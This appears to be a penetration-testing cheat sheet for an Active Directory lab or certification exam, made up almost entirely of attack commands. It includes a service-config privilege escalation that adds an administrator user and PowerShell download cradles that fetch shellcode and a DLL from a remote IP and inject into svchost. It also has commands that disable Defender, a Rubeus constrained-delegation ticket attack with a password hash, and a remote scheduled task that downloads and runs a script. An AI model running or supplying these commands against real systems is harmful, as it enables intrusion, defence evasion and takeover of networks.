# GOC2

## Notes

* create user to privesc

```
shell sc config SNMPTRAP binPath= 'C:\\windows\system32\cmd.exe /c net user tester dawoof7123!!! /add && net localgroup Administrators tester /add'
shell sc config SNMPTRAP start= 'demand'
```

* convert command to powershell b64
```
echo -n '$s=($(IWR -Uri http://172.16.99.201/srdi.bin -UseBasicParsing).Content);$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://172.16.99.201/TurtleToolKit.dll -UseBasicParsing).Content);Import-Module -Assembly $a;Invoke-SpawnInject -shellcode $s -exeName svchost.exe' | iconv -t UTF16LE -f UTF8 | base64 -w0
```

* powershell callback 
```
powershell.exe -c "$s=($(IWR -Uri http://172.16.99.201/srdi.bin - UseBasicParsing).Content);$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://172.16.99.201/TurtleToolKit.dll -UseBasicParsing).Content);Import-Module -Assembly $a;Invoke-SpawnInject -shellcode $s -exeName svchost.exe'"
```

* Get Applocker Policy / Check Langauge Mode
```
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
$ExecutionContext.SessionState.LanguageMode
```

* Turn off defender

```
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose`
```


* PowerView
Check current user for acls.
```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

* winrm code exec

```
dcorp-adminsrv 5985 'powershell.exe -c "rundll32 C:\\c.dll,Execute"' 0
```

* sharp hound
```
spawn-inject-pipe C:\tmp\ExamTools\DonutPayloads\sharphound.donut svchost.exe 10
```



* check for constained delegation powerview/sharpview
```
Get-DomainComputer -Unconstrained
```
* check for unconstrained delegation powerview/sharpview

```
Get-DomainComputer -TrustedToAuth
```


* rubueas constrained delegation example
```
s4u /user:studvm$ /rc4:4067279bbc60f6e9b19d2603ccfdfd88 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /altservice:HOST /ptt
```

* scheduled task pivot example using host ticket.

```
schtasks /create /S mgmtsrv.tech.finance.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.99.11/gotim.ps1''')'"

schtasks /Run /S mgmtsrv.tech.finance.corp /TN "SomeTaskName"
```